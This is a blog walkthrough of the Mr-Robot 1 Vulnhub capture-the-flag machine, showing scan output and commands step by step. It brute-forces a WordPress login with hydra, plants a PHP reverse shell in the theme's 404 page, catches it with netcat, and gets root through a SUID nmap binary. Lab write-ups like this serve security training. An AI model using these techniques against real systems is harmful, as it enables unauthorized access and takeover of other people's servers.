---
date: 2020-04-21 18:24:19
layout: post
title: "Mr Robot Vulnhub Walkthrough"
subtitle:
description: Mr-Robot 1 is one of vulnhub's CTF challenges, based on the favored TV series 'Mr Robot' (which is one of the best TV series).
image: /assets/img/uploads/mr-robot-ctf/mr-robot.jpg
optimized_image: /assets/img/uploads/mr-robot-ctf/mr-robot-optimized.jpg
category: walkthrough
tags: vulnhub boot2root
author:
paginate: false
---

Mr-Robot: 1 is one of vulnhub's CTF challenges, based on the favored TV series 'Mr Robot' (which is one of the best TV series). There are 3 hidden keys in the VM. Our objective is to locate all 3 keys.

We begin our reconnaissance by running a port scan with Nmap, checking default scripts and testing
for vulnerabilities.

```r
m1m3@kali:~$ nmap -sC -sV -oA nmap/mrRobot 192.168.1.7

Starting Nmap 7.80 ( https://nmap.org )
Nmap scan report for 192.168.1.7
Host is up (0.0018s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesnt have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesnt have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.91 seconds

```
<br>
We see a ssh port open and ports 80 and 443 are open. Let's fire up our browser and see what's running on port 80.

<center><br>
<img src="/assets/img/uploads/mr-robot-ctf/port80.png">
</center>

### KEY-1-OF-3

We'll try with some basics first. How about checking out for a robots.txt file?

```r
User-agent: *
fsocity.dic
key-1-of-3.txt
```

BOOM! We just found a dictionary file as well as our first key. Lets grab our first key at <b>http://target_ip/key-1-of-3.txt</b>. Also lets download the dictionary file, it might be useful.

Now let's use gobuster to search for directories we have.

```r
m1m3@kali:~$ gobuster dir -u http://192.168.1.7 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.log

===============================================================                 
Gobuster v3.0.1                                 
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================                                                                                                          
[+] Url:            http://192.168.1.7                 
[+] Threads:        10                 
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt    
[+] Status codes:   200,204,301,302,307,401,403 
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
 Starting gobuster
===============================================================
/images (Status: 301)
/blog (Status: 301)
/sitemap (Status: 200)
/rss (Status: 301)
/login (Status: 302)
/feed (Status: 301)
/video (Status: 301)
/image (Status: 301)
/wp-content (Status: 301)
/admin (Status: 301)
/intro (Status: 200)
/wp-login (Status: 200)
/css (Status: 301)
/license (Status: 200)
/wp-includes (Status: 301)
/js (Status: 301)
/readme (Status: 200)
/robots (Status: 200)
```

We see a lot of directories here. Also, we can see this site is running wordpress. So let's try bruteforcing the <i>/wp-login</i> with the dictionary file we have. Let's fire up burp to intercept the login request. I'll try a random username and password.

<center><br>
<img src="/assets/img/uploads/mr-robot-ctf/burp.png">
</center>

And we got this:<br>
<i>log=admin&pwd=admin&wp-submit=Log+In</i>

I'll be using <i>hydra</i> to fuzz the username. Before that let's sort the dictionary file to remove duplicate words using: 

`$ sort fsocity.dic | uniq > sorted.dic`

```r
m1m3@kali:~$ hydra -V -L sorted.dic -p 4444 192.168.1.7 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid Username' | grep http-post-form

[DATA] attacking http-post-form://192.168.1.7:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid Username
[80][http-post-form] host: 192.168.1.7   login: Elliot   password: 4444
[80][http-post-form] host: 192.168.1.7   login: elliot   password: 4444
[80][http-post-form] host: 192.168.1.7   login: ELLIOT   password: 4444
```
We got the username Elliot, Now we will run the same attack again for the password.

```r
m1m3@kali:~$ hydra 192.168.1.7 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^:incorrect" -l Elliot -P sorted.dic -t 10 -w 30

Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-28 15:17:15
[DATA] max 10 tasks per 1 server, overall 10 tasks, 11452 login tries (l:1/p:11452), ~1146 tries per task
[DATA] attacking http-post-form://192.168.1.7:80/wp-login.php:log=^USER^&pwd=^PASS^:incorrect

[80][http-post-form] host: 192.168.1.7   login: Elliot   password: ER28-0652

1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished.
```

Thats it we just gained access to the WordPress platform, with the username Elliot and the password ER28-0652! Now we need to find a way to get a reverse shell. 

### KEY-2-OF-3

We can update a plugin with a php reverse shell to to gain access. I'll be using the php shell from <a href="https://github.com/pentestmonkey/php-reverse-shell">pentest monkey.</a>

<center><br>
<img src="/assets/img/uploads/mr-robot-ctf/404plugin.png">
</center>

I've edited the 404.php Now our code will be executed if we go to any random url that doesn't exists. And we manage to get a reverse shell from the machine.

```r
m1m3@kali:~$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.1.12] from (UNKNOWN) [192.168.1.7] 48942
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 10:50:44 up  2:25,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: cant access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
daemon@linux:/$ 
```

Now If we try to access the second flag in /home/robot/key-2-of-3.txt, we get an error saying permission denied.

```r
daemon@linux:/home/robot$ wc -c key-2-of-3.txt
wc -c key-2-of-3.txt
wc: key-2-of-3.txt: Permission denied
daemon@linux:/home/robot$ 
```

Also we have a <i>password.raw-md5</i> file in the home directory. This will be our way in!
This can be cracked using any online md5 decryptor and we the password of robot user as <i>abcdefghijklmnopqrstuvwxyz</i>


Now we can login as user robot using: 
```r
daemon@linux:/home/robot$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ wc -c key-2-of-3.txt    
wc -c key-2-of-3.txt
33 key-2-of-3.txt
```

### KEY-3-OF-3

Now we must find a way to root. What about SUID files? Let's see.

```r
robot@linux:~$ find / -user root -perm -4000 -exec ls -ldb {} \; | grep -v proc
< root -perm -4000 -exec ls -ldb {} \; | grep -v proc                        
...
-rwsr-xr-x 1 root root 155008 Mar 12  2015 /usr/bin/sudo
-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
-rwsr-xr-x 1 root root 440416 May 12  2014 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
...
```

We can see that nmap is installed in the machine, this can be our way to root. Looking up in the <a href='https://gtfobins.github.io/gtfobins/nmap/'>GTFO Bins,</a> I found we can get root using:

```r
robot@linux:~$ nmap --interactive                                 
nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )  
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh                                                          
!sh                                                             
# whoami
whoami
root
# wc -c /root/key-3-of-3.txt
wc -c /root/key-3-of-3.txt
33 /root/key-3-of-3.txt
```

That’s it! Thanks for reading. Stay tuned for similar walkthroughs and much more coming up in the near future!
If you have any queries, you can contact me <a href="/contact">here.</a>

NOTE: The awesome artwork used in this article was created by <a href="https://dribbble.com/Ty_poe">Tyler Pate.</a>